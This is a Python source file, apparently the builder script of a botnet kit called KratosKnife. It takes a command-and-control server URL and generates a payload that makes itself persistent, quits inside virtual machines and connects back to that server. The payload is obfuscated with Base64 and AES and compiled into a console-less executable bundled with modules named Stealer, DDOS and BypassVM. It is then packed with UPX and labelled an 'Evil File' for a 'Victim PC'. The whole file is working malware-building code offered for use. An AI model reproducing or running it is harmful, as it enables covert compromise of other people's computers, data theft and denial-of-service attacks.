import requests, subprocess, os, shutil, argparse, sys

# Crypter Modules
import crypter.Base64_encrypt as Base64_encrypt
import crypter.AES_encrypt as AES_encrypt
import banners # Assuming banners is a local module for ASCII art

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def get_arguments():
    parser = argparse.ArgumentParser(description=f'{RED}KratosKnife v1.0')
    parser._optionals.title = f"{GREEN}Optional Arguments{YELLOW}"
    parser.add_argument("--interactive", dest="interactive", help="Takes Input by asking Questions", action='store_true')   
    parser.add_argument("--icon", dest="icon", help="Specify Icon Path, Icon of Evil File [Note : Must Be .ico].")    
    parser.add_argument("-i", "--interval", dest="interval", help="Time Interval to Connect Server Every __ seconds. default=4", type=int, default=4)
    parser.add_argument("-t", "--persistence", dest="time_persistent", help="Becoming Persistence After __ seconds. default=10", type=int, default=10)         
    parser.add_argument("-b", "--bind", dest="bind", help="Built-In Binder : Specify Path of Legitimate file. [Under Development]") 
    
    required_arguments = parser.add_argument_group(f'{RED}Required Arguments{GREEN}')
    required_arguments.add_argument("-s", "--server", dest="server", help="Command & Control Server for Botnet.")
    required_arguments.add_argument("-o", "--output", dest="output_exe_name_base", help="Output file name (base name for .exe).")
    return parser.parse_args()

def refine_panelURL(panelURL):
    if not panelURL.endswith("/"):
        panelURL += "/"

    if not (panelURL.startswith("http://") or panelURL.startswith("https://")):
        panelURL = "http://" + panelURL
    
    return panelURL
    
def get_python_pyinstaller_path():
    try:
        # On Windows, 'where python' returns path to python.exe
        # subprocess.check_output(text=True) ensures string output in Python 3
        python_path_output = subprocess.check_output("where python", shell=True, text=True, stderr=subprocess.DEVNULL)
        # Take the first path in case multiple pythons are found
        python_path = python_path_output.strip().split('\n')[0].strip()
        python_path = python_path.replace("\\", "/") # Normalize slashes
        
        # Try common PyInstaller locations relative to python.exe
        possible_paths = [
            python_path.replace("python.exe", "Scripts/pyinstaller.exe"), # Common for Windows pip
            python_path.replace("python.exe", "Scripts/pyinstaller"),     # Linux/macOS or if .exe omitted
            os.path.join(os.path.dirname(python_path), "Scripts", "pyinstaller.exe"), # More robust path join
            os.path.join(os.path.dirname(python_path), "bin", "pyinstaller") # Common for venv/system installs
        ]

        for p_path in possible_paths:
            if os.path.exists(p_path):
                return p_path

        print(f"{RED}[!] Warning: PyInstaller not found at expected paths. Please ensure it's installed and accessible via 'where python' or manually update Generator.py.")
        print(f"{YELLOW}Attempted paths: {', '.join(possible_paths)}")
        sys.exit(1)
            
    except subprocess.CalledProcessError:
        print(f"{RED}[!] Error: 'where python' command failed. Python might not be in your PATH.")
        sys.exit(1)
    except Exception as e:
        print(f"{RED}[!] Error finding PyInstaller: {e}")
        print(f"{YELLOW}Please ensure Python is in your PATH and PyInstaller is installed. (e.g., pip install pyinstaller)")
        sys.exit(1)

def run_interactive_mode():
    print(f"\n{GREEN}[INTERACTIVE MODE ENABLED]")
    print(f"{YELLOW}\n*********************************************************************")
    
    panelURL = ""
    panel_verified = False
    while not panel_verified:
        panelURL = input(f"{WHITE}\n[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
        panelURL = refine_panelURL(panelURL)

        try:
            check_panel = requests.get(url = panelURL + "check_panel.php", timeout=10)
            
            if check_panel.text == "Panel Enabled":
                panel_verified = True
                print(f"{GREEN}[+] Panel Verified Successfully!")
            else:
                print(f"{RED}[!] Panel is disabled or not configured, Please Try Again !")

        except requests.exceptions.RequestException:
            print(f"{RED}[!] Unable to Verify Server URL. Please check your connection or URL and try again.")
            
    output_exe_name_base = input(f"{WHITE}[?] Enter Output File Name (without extension): {YELLOW}")
    icon_path = input(f"{WHITE}[?] Enter Icon File Path (Must be .ico) [LEAVE BLANK TO USE DEFAULT ICON] : {GREEN}")    
    time_persistent = int(input(f"{WHITE}[?] Botnet Becomes Persistence After __ seconds [DEFAULT : 10]: {GREEN}") or "10")
    interval = int(input(f"{WHITE}[?] Time Interval to Connect Server Every __ seconds [DEFAULT : 4]: {GREEN}") or "4")
    print(f"{YELLOW}\n*********************************************************************")
    
    return panelURL, output_exe_name_base, icon_path, time_persistent, interval

def generate_payload(source_py_path, panelURL, time_persistent, interval):
    with open(source_py_path, "w+") as file:
        file.write("import time, sys, requests\n") # Added requests import
        file.write("import KratosKnife as K\n\n")
        file.write(f"def main_payload_loop():\n") 
        file.write("\twhile True:\n") 
        file.write("\t\ttry:\n")
        file.write(f"\t\t\tpayload_instance = K.Payload(\"{panelURL}\", {interval})\n") 
        file.write(f"\t\t\tpayload_instance.become_persistent({time_persistent})\n")
        file.write(f"\t\t\tpayload_instance.detect_vm_and_quit()\n") 
        file.write(f"\t\t\tpayload_instance.connect()\n") 
        file.write(f"\t\t\tpayload_instance.start()\n") 
        file.write("\t\texcept requests.exceptions.ConnectionError:\n") 
        file.write("\t\t\ttime.sleep(10)\n")
        file.write("\t\texcept requests.exceptions.RequestException as e:\n") 
        file.write("\t\t\tsys.exit(1)\n\n") 
        file.write("\t\texcept KeyboardInterrupt:\n") 
        file.write("\t\t\tsys.exit(0)\n\n")
        file.write(f"main_payload_loop()\n")    

def compile_source(source_py_path, icon_path, debugging, output_exe_name_base):
    # PyInstaller will name the output EXE based on the input script's base name unless --name is used
    # We want the output EXE to be named according to output_exe_name_base, so we use --name
    base_command = [PYTHON_PYINSTALLER_PATH, "--onefile", "--hidden-import=KratosKnife", "--hidden-import=Stealer", "--hidden-import=ClientsCMD", "--hidden-import=ComputerCMD", "--hidden-import=HTTPSocket", "--hidden-import=DDOS", "--hidden-import=BypassVM", "--name", output_exe_name_base, source_py_path]
    
    if debugging != "y": # Default is no console
        base_command.append("--noconsole")

    if icon_path and icon_path != "":
        base_command.extend([ "-i", icon_path])
    
    print(f"{MAGENTA}[*] Running PyInstaller command: {' '.join(base_command)}")
    try:
        subprocess.run(base_command, shell=True, check=True) # check=True will raise CalledProcessError on non-zero exit codes
    except subprocess.CalledProcessError as e:
        print(f"{RED}[!] PyInstaller compilation failed. Error: {e}")
        sys.exit(1)

def pack_exe_using_upx(output_exe_name_base):
    original_cwd = os.getcwd()
    upx_source_path = os.path.join(original_cwd, "upx", "upx.exe")
    dist_folder_path = os.path.join(original_cwd, "dist")
    output_exe_path = os.path.join(dist_folder_path, f"{output_exe_name_base}.exe")

    if os.path.exists(upx_source_path) and os.path.exists(output_exe_path):
        try:
            shutil.copy2(upx_source_path, dist_folder_path) # Copy upx.exe to dist folder
            os.chdir(dist_folder_path) # Change directory to dist for UPX to find the exe
            
            print(f"{YELLOW}\n[*] Packing Exe Using UPX")
            
            # Use subprocess.run for better control over output and errors
            subprocess.run(["upx.exe", f"{output_exe_name_base}.exe"], check=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
            print(f"{GREEN}[+] Packed Successfully !")
        except subprocess.CalledProcessError as e:
            print(f"{RED}[!] UPX Packing Failed: {e.stderr}")
        except FileNotFoundError:
            print(f"{RED}[!] UPX executable not found in {dist_folder_path}. Packing skipped.")
        except Exception as e:
            print(f"{RED}[!] An unexpected error occurred during UPX packing: {e}")
        finally:
            # Clean up copied upx.exe regardless of success or failure
            if os.path.exists("upx.exe"):
                os.remove("upx.exe")
            os.chdir(original_cwd) # Return to original directory
    else:
        print(f"{RED}[!] UPX (upx.exe) not found at {upx_source_path} or compiled EXE not found at {output_exe_path}. Skipping UPX packing.")

def del_junk_file(source_py_path, output_exe_name_base):
    # List of paths/patterns to clean
    paths_to_clean = [
        os.path.join(os.getcwd(), "build"),
        source_py_path,
        os.path.join(os.getcwd(), f"{output_exe_name_base}.spec"),
        os.path.join(os.getcwd(), "__pycache__")
    ]

    for path in paths_to_clean:
        try:
            if os.path.exists(path):
                if os.path.isdir(path):
                    shutil.rmtree(path)
                else:
                    os.remove(path)
        except OSError as e:
            print(f"{RED}[!] Error deleting {path}: {e}")
        except Exception as e:
            print(f"{RED}[!] An unexpected error occurred during junk file deletion: {e}")

def exit_greet():
    os.system('cls' if os.name == 'nt' else 'clear')      
    print(GREEN + '''Thank You for using KratosKnife, Think Great & Touch The Sky!  \n''' + END)
    sys.exit(0)

if __name__ == "__main__":
    dist_folder = os.path.join(os.getcwd(), "dist")
    try:
        # Clean up dist folder at the start for a fresh build
        if os.path.exists(dist_folder):
            shutil.rmtree(dist_folder)
    except OSError as e:
        print(f"{RED}[!] Error cleaning previous 'dist' folder: {e}")
        # Continue, as this might not be critical but a warning is needed

    PYTHON_PYINSTALLER_PATH = get_python_pyinstaller_path() # Determine path once at start

    arguments = None
    panelURL = ""
    output_exe_name_base = ""
    icon_path = ""
    time_persistent = 10 # Default value
    interval = 4 # Default value
    source_py_path = "" # Initialize here

    try:
        print(banners.get_banner())
        print(f"{YELLOW}Author: {GREEN}Pushpender | {YELLOW}GitHub: {GREEN}github.com/Technowlogy-Pushpender\n")    
    
        arguments = get_arguments()      

        if arguments.interactive:
            panelURL, output_exe_name_base, icon_path, time_persistent, interval = run_interactive_mode() 
            
        if not arguments.interactive:
            if not arguments.server:
                print(f"{YELLOW}\n*******************************************")            
                print(f"{RED}[WARNING] : {YELLOW}You Have Not Defined Server URL")
                print(f"{YELLOW}*******************************************")
                
                panel_verified = False
                while not panel_verified:
                    panelURL = input(f"{WHITE}\n[?] Enter KartosKnife Command & Control Server URL: {GREEN}")
                    panelURL = refine_panelURL(panelURL)

                    try:
                        check_panel = requests.get(url = panelURL + "check_panel.php", timeout=10)
                        
                        if check_panel.text == "Panel Enabled":
                            panel_verified = True
                            print(f"{GREEN}[+] Panel Verified Successfully!")
                        else:
                            print(f"{RED}[!] Panel is disabled or not configured, Please Try Again !")

                    except requests.exceptions.RequestException:
                        print(f"{RED}[!] Unable to Verify Server URL. Please check your connection or URL and try again.")
            else:            
                panelURL = arguments.server
                panelURL = refine_panelURL(panelURL)
                        
            if not arguments.output_exe_name_base:
                output_exe_name_base = input(f"{WHITE}[?] Enter Output File Name (without extension): {GREEN}")                
            else: 
                output_exe_name_base = arguments.output_exe_name_base
                
            time_persistent = arguments.time_persistent # Use value from argparse
            interval = arguments.interval # Use value from argparse

            if not arguments.icon:
                icon_path = "" 
                print(f"{YELLOW}\n****************************************************************")            
                print(f"{RED}[WARNING] : {YELLOW}You Have Not Defined BOTNET Icon, Using Default Icon")
                print(f"{YELLOW}****************************************************************")    
            else:
                icon_path = arguments.icon
        
        source_py_path = f"{output_exe_name_base}.py" # Define the temporary Python source file path

        print(f"{YELLOW}\n*********************************************************************")
        print(f"{WHITE}[If payload is unable to execute on Victim PC, Enable Debugging Mode]")
        print(f"{YELLOW}*********************************************************************")
        debugging = input(f"{WHITE}\n[?] Want to Enable Debugging Mode (y/n) [DEFAULT: n]: {GREEN}")
        debugging = debugging.lower()
        
        print(f"{YELLOW}\n[*] Generating Payload Source Codes ...")
        generate_payload(source_py_path, panelURL, time_persistent, interval)  # Generating Payload Source File
        print(f"{GREEN}[+] Payload Source Codes Generated Successfully!")

        key = input(f"{WHITE}\n[?] Enter Weak Numeric Key [Recommended Password Length : 5] : ")
        
        print(f"{YELLOW}\n[*] Initiating Base64 Encryption Process ...")    
        base64_enc = Base64_encrypt.Encrypt()
        base64_enc.encrypt(source_py_path)
        print(f"{GREEN}[+] Operation Completed Successfully!\n")     

        print(f"{YELLOW}\n[*] Initiating AES Encryption Process ...")
        AES_enc = AES_encrypt.Encryptor(key, source_py_path) 
        AES_enc.encrypt_file()
        print(f"{GREEN}[+] Process Completed Successfully!")
        
        print(f"{YELLOW}\n[*] Compiling Source codes ...{MAGENTA}")
        compile_source(source_py_path, icon_path, debugging, output_exe_name_base)  #Compiling the source code
        
        # Check if output_exe_name_base is set and the compiled exe exists for UPX packing
        compiled_exe_path = os.path.join(os.getcwd(), 'dist', f'{output_exe_name_base}.exe')
        if output_exe_name_base and os.path.exists(compiled_exe_path):
                   
            print(f"{GREEN}\n[+] Compiled Successfully !")
            print(f"{GREEN}[+] Evil File is saved at : {YELLOW}{os.path.join('dist', f'{output_exe_name_base}.exe')}")
            
            pack_exe_using_upx(output_exe_name_base)  # Packing Exe Using UPX Packer
        else:
            # Handle case where output.exe might not be found or output_exe_name_base is missing
            print(f"{RED}[!] Compiled EXE not found at {compiled_exe_path}. Skipping UPX packing.")

        print(f"{YELLOW}\n[*] Deleting Junk Files ...")
        del_junk_file(source_py_path, output_exe_name_base)  
        print(f"{GREEN}[+] Deleted Successfully !")

    except KeyboardInterrupt:  # Catch KeyboardInterrupt first for graceful exit
        if source_py_path and output_exe_name_base:
            print(f"{YELLOW}\n[!] Interrupted. Attempting to clean up junk files...") 
            del_junk_file(source_py_path, output_exe_name_base)
        exit_greet()

    except Exception as e:
        if source_py_path and output_exe_name_base:
            print(f"{YELLOW}\n[!] An error occurred. Attempting to clean up junk files...")
            del_junk_file(source_py_path, output_exe_name_base)
        print(f"{RED}[!] Fatal Error : {YELLOW}{e}")
        sys.exit(1)
